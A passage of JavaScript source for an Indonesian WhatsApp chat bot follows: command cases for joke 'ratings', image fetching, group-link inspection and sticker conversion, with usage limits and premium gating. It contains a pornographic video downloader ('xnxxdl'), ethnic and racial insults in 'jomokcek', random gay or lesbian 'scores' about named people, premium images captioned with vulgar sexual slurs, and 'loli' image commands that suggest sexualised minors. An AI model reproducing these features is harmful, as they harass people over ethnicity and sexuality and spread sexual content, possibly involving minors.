} else if (args[0] == 'off'){
global.autoTyping = false
reply('Auto AI dimatikan, jangan lupa donasi owner')
} else reply('on / off')
break
case'xnxxdl':
{
if (!text) return reply(`*Gunakan Dengan*\n\nexample : ${prefix+command} linknya`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let anu = await fetchJson(`https://skizo.tech/api/xnxxdl?urlxnxx=${text}&apikey=${global.skizo}`)
const cpt = anu.title
const nick = anu.quality
kyy.sendMessage(m.chat, { video: { url: anu.url}, caption: `*TITLE* : ${cpt}\n*QUALITY* : ${nick}`}, )
}
break
case 'ipbot':
                if (!isCreator) return reply('not for NPC')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'rate': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!m.isGroup) return reply(`khusud group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'jomokcek': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (!m.isGroup) return reply(`khusus group`)
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break
case 'stickersearch': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return reply(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
reply(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
            case 'cekgc': {
            if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
kyy.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ ID Group : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

© ${global.fake}`
try {
pp = await kyy.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
kyy.sendFile(from, pp, "", m, { caption: tekse })
})
}
break
 case 'delchat':
if (!isCreator) return reply(`Khusus Kyy`)
await kyy.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply('sukses menghapus chat')
break
case 'leagueid': case 'idbahasa': case 'kodebahasa':{
reply(`*❲ COUNTRY ID ❳*
    ⏣ •  af: Afrikaans 
    ⏣ •  sq: Albanian
    ⏣ •  ar: Arabic
    ⏣ •  hy: Armenian
    ⏣ •  ca: Catalan 
    ⏣ •  zh: Chinese 
    ⏣ •  zh-cn: Chinese (Mandarin/China)
    ⏣ •  zh-tw: Chinese (Mandarin/Taiwan)
    ⏣ •  zh-yue: Chinese (Cantonese)
    ⏣ •  hr: Croatian
    ⏣ •  cs: Czech
    ⏣ •  da: Danish
    ⏣ •  nl: Dutch
    ⏣ •  en: English    
    ⏣ •  en-au: English (Australia)
    ⏣ •  en-uk: English (United Kingdom)
    ⏣ •  en-us: English (United States) 
    ⏣ •  eo: Esperanto 
    ⏣ •  fi: Finnish 
    ⏣ •  fr: French
    ⏣ •  de: German
    ⏣ •  el: Greek 
    ⏣ •  ht: Haitian Creole 
    ⏣ •  hi: Hindi 
    ⏣ •  hu: Hungarian 
    ⏣ •  is: Icelandic 
    ⏣ •  id: Indonesian 
    ⏣ •  it: Italian
    ⏣ •  ja: Japanese
    ⏣ •  ko: Korean
    ⏣ •  la: Latin
    ⏣ •  lv: Latvian
    ⏣ •  mk: Macedonian
    ⏣ •  no: Norwegian
    ⏣ •  pl: Polish
    ⏣ •  pt: Portuguese
    ⏣ •  pt-br: Portuguese (Brazil)
    ⏣ •  ro: Romanian
    ⏣ •  ru: Russian
    ⏣ •  sr: Serbian
    ⏣ •  sk: Slovak
    ⏣ •  es: Spanish 
    ⏣ •  es-es: Spanish (Spain)
    ⏣ •  es-us: Spanish (United States)
    ⏣ •  sw: Swahili
    ⏣ •  sv: Swedish
    ⏣ •  ta: Tamil
    ⏣ •  th: Thai
    ⏣ •  tr: Turkish
    ⏣ •  vi: Vietnamese 
    ⏣ •  cy: Welse`)
}
break
case 'cecanindo': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanjepan': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan jepang`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanmalaysia': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanhijaber': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan hijaber`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanchina': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanvietnam': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecankorea': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan korea`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecan': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================//
//asupan menu
case 'asupan': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`asupan`)
result = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
case 'paptt1': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
teks28 = `SANGEAN KONTOL`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'paptt2': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
teks28 = `SANGEAN KONTOL`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/a5730f376956d82f9689c.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'paptt3': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
teks28 = `SNGEAN KONTOL`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'paptt4': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
teks28 = `SANGEAN KONTOL`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/0e5be819fa70516f63766.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'paptt5': {
if (!isPrem) return reply(`Buy Prem Dlu Lah Di Kyy Wkwk`)
teks28 = `SANGEAN KONTL`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/af029472c3fcf859fd281.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'toimage': case 'toimg': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await kyy.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kyy.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
const hy = createSerial(20) 
case 'ceksn':
m.reply(`SN : ${serialUser}`)
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elena': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!m.isGroup) return reply(`Khusus Group`)
reply("Gambar Akan Dikirim Lewat Private Chat")
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
